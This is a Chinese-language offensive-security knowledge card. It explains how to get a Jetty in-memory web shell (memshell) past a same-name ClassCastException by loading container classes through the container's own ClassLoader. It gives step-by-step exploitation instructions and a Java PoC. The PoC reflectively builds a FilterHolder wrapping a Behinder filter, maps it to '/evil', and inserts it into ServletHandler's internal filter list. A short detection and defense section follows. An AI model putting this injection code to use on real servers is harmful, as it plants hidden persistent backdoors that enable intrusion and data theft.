---
id: web-java-classloader-container-type-identity-memshell
title: 跨类加载器注入容器对象：同名 FilterMapping 的 ClassCastException 与容器 ClassLoader 反射实例化
type: scenario
domain: web
path: web/java/classloader
technique: container-classloader-type-identity-memshell
tags:
- java
- classloader
- memshell
- jetty
- reflection
- classcast
- namespace
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V296
  verified_at: '2026-11-08T08:15:56+08:00'
  notes: 已对照原文与43张图核对：同名 FilterMapping ClassCastException 报错与堆栈（图17）、getFilterChain 遍历强转（图18）、注入后 _filterPathMappings 第三个元素异常（图19）、正常 HelloFilter holder 与注入 holder 的 _filter/_state 对比（图20/21）、FilterHolder 构造调 setFilter（图22）、9.4.44 setFilter→setInstance（图23）、new 与反射实例化 FilterHolder 的 reflectionData 差异及混用 setFilterHolder 找不到方法（图25/26）均与卡片一致。JVM 类型身份=二进制名+定义类加载器、统一用 servletHandler.getClass().getClassLoader() 加载容器类、holder/mapping 必须同源加载器的描述与原文结论一致。未验证点：未本机复跑；原文对 construction 的解释以实际 setFilter/setInstance 链路为准（卡片未照抄原文多态说法）；frontmatter 无 sources/source_url。dedup 仅命中自身，与 Jetty Filter/Servlet/FilterHolder 三卡为 related（本卡是跨加载器类型身份通用问题，三卡是具体注入机制），并列保留。
url: /docs/web/java/classloader/web-java-classloader-container-type-identity-memshell/
draft: false
kb_aliases:
- FilterMapping cannot be cast to FilterMapping
- 同名类 ClassCastException
- 类加载器命名空间
- 容器 ClassLoader 反射实例化
- 内存马类加载器
- Jetty 内存马 ClassCastException
---

## 一句话结论

内存马类与容器内部类由不同 ClassLoader 加载时，`new FilterMapping()` 得到的是“同名但不同 Class”的对象；把它加入 `ServletHandler._filterPathMappings` 后，容器遍历时执行 `(FilterMapping) obj` 必然抛 `ClassCastException: ...FilterMapping cannot be cast to ...FilterMapping`。正确做法是用容器对象自己的 ClassLoader（如 `servletHandler.getClass().getClassLoader()`）加载并反射实例化容器类，让类型身份一致。

## 原理

- **Java 类身份 = 二进制名 + 定义它的 ClassLoader**：`Class` 对象的相等/强转不只看全限定名，还看定义加载器。两个加载器各自加载一份 `org.eclipse.jetty.servlet.FilterMapping`，得到的是两个不同的 `Class`；JVM 认为它们互不兼容。
- **为什么内存马会踩到**：内存马类通常由 TemplatesImpl/BCEL/自定义 loader 或 Maven 插件 loader 加载；容器（Jetty WebAppClassLoader、Tomcat WebappClassLoader）内部字段和方法签名引用的是容器自己那份 `FilterMapping`。内存马代码里的 `new FilterMapping()` 走的是内存马类的加载器，可能从另一路径加载同名类，于是加入容器列表的对象不是容器期望的类型。
- **报错形态**：`java.lang.ClassCastException: org.eclipse.jetty.servlet.FilterMapping cannot be cast to org.eclipse.jetty.servlet.FilterMapping`——名字完全相同，只有加载器不同；堆栈落在容器的遍历/`getFilterChain` 上。
- **修复**：用 `servletHandler.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterMapping")` 取容器那份 Class，再 `getDeclaredConstructor()` + `setAccessible(true)` + `newInstance()`。同理，`FilterHolder` 也必须用同一加载器构造；否则 `getDeclaredMethod("setFilterHolder", holder.getClass())` 会因为参数类型是容器类而找不到方法。
- **为什么不能混用**：即使用反射构造了 mapping，只要 holder 是 `new` 出来的另一份类，`setFilterHolder` 的参数类型就匹配不上；反过来也一样。相关的一组类型必须统一从容器加载器取。
- **一般化**：Tomcat 的 `FilterConfig`/`ApplicationFilterConfig`、Spring 的 `HandlerMapping`、Jetty 的 `ServletHolder`/`ServletMapping` 都有同样问题；这是所有“反射改容器内部结构”型内存马的通用坑。

## 触发条件

- 目标容器使用多 ClassLoader 架构（Jetty WebAppClassLoader、Tomcat WebappClassLoader、Spring Boot LaunchedURLClassLoader、插件框架等）。
- 内存马类由与容器内部类不同的加载器加载（反序列化 loader、TemplatesImpl、插件 loader、Maven 插件 loader 等）。
- 攻击者直接 `new` 容器类或混用不同 loader 构造的对象，再放入容器内部集合/字段。
- 容器在遍历时对元素做强转或按具体 Class 匹配方法签名。

## 利用步骤

1. **复现**：按常规写法 `new FilterMapping()`、`new FilterHolder(filter)` 构造并加入 `_filterPathMappings`，访问路由，观察是否出现同名类 `ClassCastException`。
2. **确认加载器**：在断点/日志中打印 `servletHandler.getClass().getClassLoader()` 与 `filterMapping.getClass().getClassLoader()`，确认两者不同。
3. **统一加载器**：把 `new FilterMapping()` 换成 `cl.loadClass("org.eclipse.jetty.servlet.FilterMapping").getDeclaredConstructor().newInstance()`；holder 同样处理。
4. **匹配方法签名**：`setFilterHolder` 的参数类型用 `holder.getClass()`（即容器那份类），不要用内存马侧 import 的 Class。
5. **验证**：再次注册并访问，确认不再抛 ClassCastException，Filter/Servlet 正常命中。
6. **记录**：把容器类名、加载器类型、失败/成功写法写入利用脚本注释，换目标容器时按同样思路调整。

## PoC

```java
// 错误：new 走内存马类的加载器，可能与容器内部类不是同一个 Class
// FilterMapping mapping = new FilterMapping();
// FilterHolder holder = new FilterHolder(filter);

// 正确：统一用容器对象的 ClassLoader
ClassLoader cl = servletHandler.getClass().getClassLoader();

Object holder = cl.loadClass("org.eclipse.jetty.servlet.FilterHolder")
        .getDeclaredConstructor().newInstance();
holder.getClass().getDeclaredMethod("setFilter", javax.servlet.Filter.class)
        .invoke(holder, new BehinderFilter());
holder.getClass().getSuperclass().getDeclaredMethod("setName", String.class)
        .invoke(holder, "BehinderFilter");

Object mapping = cl.loadClass("org.eclipse.jetty.servlet.FilterMapping")
        .getDeclaredConstructor().newInstance();
java.lang.reflect.Method setHolder = mapping.getClass()
        .getDeclaredMethod("setFilterHolder", holder.getClass());
setHolder.setAccessible(true);
setHolder.invoke(mapping, holder);
mapping.getClass().getDeclaredMethod("setPathSpec", String.class)
        .invoke(mapping, "/evil");

java.util.ArrayList list = (java.util.ArrayList) getFieldValue(servletHandler, "_filterPathMappings");
list.add(mapping);
```

排查加载器的辅助输出：

```java
System.out.println(servletHandler.getClass().getClassLoader());
System.out.println(mapping.getClass().getClassLoader());
// 两者应相同；不同则说明类型身份不一致
```

## 变体与关联

- **Tomcat**：`StandardContext.filterConfigs`、`ApplicationFilterConfig` 等内部类同样要求容器 loader；用 `context.getClass().getClassLoader()` 加载。
- **Spring/插件框架**：child-first 加载器更容易出现同名类重复加载；以“持有容器对象的那个 loader”为准，而不是 TCCL。
- **`Class.forName(name, true, loader)`**：可用于加载并初始化，但要确认 loader 是容器 loader；`loadClass` 默认不初始化，构造器仍会执行。
- **关联**：[[web-java-component-jetty9-servlethandler-filter-memshell]]（Filter 内存马主链）；[[web-java-component-jetty9-servlethandler-servlet-memshell]]（Servlet 版）；[[web-java-component-jetty9-filterholder-initialize-bypass]]（高版本初始化）；[[web-java-classloader-deserialization-memshell-loader-selection]]（加载器选型）。

## 检测与防御

- **检测**：应用日志出现同名类 `ClassCastException`（尤其 `org.eclipse.jetty.*`/`org.apache.catalina.*` 自己转自己）；类加载器统计中出现同名类多份定义；内存马扫描时按 ClassLoader 维度导出已加载类。
- **防御**：阻断任意字节码加载入口；RASP 监控跨 ClassLoader 的容器类反射构造与内部集合修改；容器升级/模块化减少重复类；发现注入后重启并轮换凭据。
- **认知**：这不是“命名空间玄学”，而是 JVM 规范决定的类型身份；排查时先打印两个对象的 `getClass().getClassLoader()`，再决定用哪个 loader。
